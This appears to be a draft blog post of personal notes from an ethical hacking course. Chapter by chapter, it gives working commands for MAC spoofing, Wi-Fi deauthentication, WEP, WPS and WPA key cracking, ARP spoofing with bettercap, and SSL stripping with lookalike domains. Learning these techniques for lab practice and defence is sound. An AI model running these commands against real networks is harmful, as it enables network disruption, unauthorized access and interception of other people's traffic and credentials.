---
title: "Learn_Ethical_Hacking_From_Scratch"
date: 2019-07-20T09:31:22+08:00
draft: true
---

## chapter 12
why change the mac address?
1. Increasr anonymity.
2. Impersonate other devices.
3. Bypass filters.

```sh
ifconfig wlan0 down
ifconfig wlan0 hw ether 00:11:22:33:44:55
ifconfig wlan0 up
```
hw:hardware
mac address will revert back to the original one when restart computer

AP : Access Point

## chapter 13

```sh
ifconfig wlan0 down
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
```

## chapter 14
```sh
airodump.ng mon0
```
```sh
service NetworkManager start

systemctl enable NetworkManager
```

## chapter 15
```sh
airodump-ng --band abg mon0
```

Most common WiFi Bands are:
   - a uses 5 Ghz frequency only.
   - b,g both use 2.4 Ghz frequency only.
   - n uses 2.4 and 5 Ghz.
   - ac users frequencies lower than 6 Ghz.

## chapter 16
capure everything
```sh
airodump-ng --bssid [some-mac-address] --channel 2 --write test mon0
```

## chapter 17 Deauthentication Attack

Disconnect any client from any network
   - Works on encrypted networks (WEP, WPA & WPA2).
   -  No need to know the network key.
   -  No need to connect to the network.

```sh
aireplay-ng --deauth [DeauthPackets] -a [NetworkMac] -c [TargetMac] [Interface]
```

## chapter 19

- WEP: Wired Equivalent Privacy
- Old encryption
- Uses an algorithm called RC4
- Still used in some networks
- Can be cracked easily

- IV is too small (only 24 bits)
- IV is sent in plain text

## chapter 20

To crack WEP we need to:
1. Capture a large number of packets/IVs.
   using airodump-ng
2. Analyse the captured IVs and crack the key.
   using aircrack-ng

```sh
aircrack-ng [cap_file_name]
```

## chapter 21

Problem:
- if network is not busy
- it would take some time to capture enough IVs

Solution:
- Force the AP to generate new IVs.

Problem:
- APs only communicate with connected clients.

Solution:
- Associate with the AP before launching the attack.

```sh
aireplay-ng --fakeauth 0 -a [NetworkMac] -h [monMac] mon0
```

## chapter 22

- Wait for an ARP packet.
- Capture it, and replay it(retransmit it).
- This causes the AP to produce another packet with a new IV.
- Keep doing this till we have enough IVs to crack the key.

```sh
aireplay-ng --arpreplay -b [NetworkMac] -h [monMac] mon0
aircrack-ng arpreplay-01.cap
```

## chapter 23

WPA / WPA2 Cracking

- Both can be cracked using the same methods.
- Made to address the issues in WEP.
- Much more secure.
- Each packet is encrypted using a unique temporary key.

Packets contain no useful infomation.

## chapter 24

```sh
wash --interface mon0

aireplay-ng --fakeauth 30 -a [NetworkMac] -h [monMac] mon0

reaver --bssid [NetworkMac] --channel 1 --interface mon0 -vvv --no-associate
```

## chapter 26

```sh
$ crunch [min] [max] [characters] -t [pattern] -o [FileName]
```

## chapter 27

Two things needed to crack WPA/WPA2:
- 4-way handshake.
- wordlist.
  
### use the default wordlist in kali
```sh
gzip -d /usr/share/wordlists/rockyou.txt.gz
```

```sh
aircrack-ng handshake_file -w wordlist_file
```

# Post-connection Attacks
## chapter 31

https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/

Passw0rd!

## chapter 32
```sh
netdiscover -r 192.168.0.1/24
```

## chapter 34 
alpine

## chapter 35
Man In The Middel Attacks 
MITM

arpspoof
ARP SPOOFING

ADDRESS RESOLUTION PROTOCOL (ARP)
simple protocol used to map IP Address of a machine to its MAC address

```sh
arp -a      // list the arp table
```

Why ARP Spoofing is possible:
1. Clients accept responses even if they did not send a request.
2. Clients trust response without any form of veritication.

## chapter 36

```sh
arpspoof -i [interface] -t [clientIP] [gatewayIP]

arpspoof -i [interface] -t [gatewayIP] [clientIP]

echo 1 > /proc/sys/net/ipv4/ip_forward
```

## chapter 37

```sh
bettercap -iface [interface]
```

## chapter 38

```sh
bettercap -iface [interface]p
> help
> help net.probe
> net.show

> set arp.spoof.fullduplex true
> set arp.spoof.targets [targetIP]
> arp.spoof on
```

## chapter 39

```sh
# in bettercap
> net.sniff on
```
vulnweb.com

## chapter 40
write caplet
```sh
net.probe on
set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.0.10
arp.spoof on
net.sniff on
```

```sh
bettercap -iface eth0 -caplet [capletFile]
```
## chapter 41
Encrypt HTTP using TLS(Transport Layer Security) or SSL(Secure Sockets Layer)

Downgrade HTTPS to HTTP

```sh
cd /usr/share/bettercap/caplets
# delete old hstshijack
# copy form the udemy
```

modify caplet
```sh
net.probe on
set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.0.10
arp.spoof on
set net.sniff.local true
net.sniff on
```

```sh
> caplets.show    //show all the capltes with the bettercap
> hstshijack/hstshijack
```

ctrl + shift + del   to open chrome clear browsing data dialog

## chapter 43

HSTS
- HTTP Strict Transport Security.
- Used by Facebook, Twitter and few other famous websites.

Problem:
- Modern browsers are hard-coded to only load a list of HSTS websites over https
  
Solution:
- Trick the browser into loading a different website.
Replace all links for HSTS websites with similar links

facebook.com -> facebook.corn
twitter.com -> twiter.com

SSL stripping

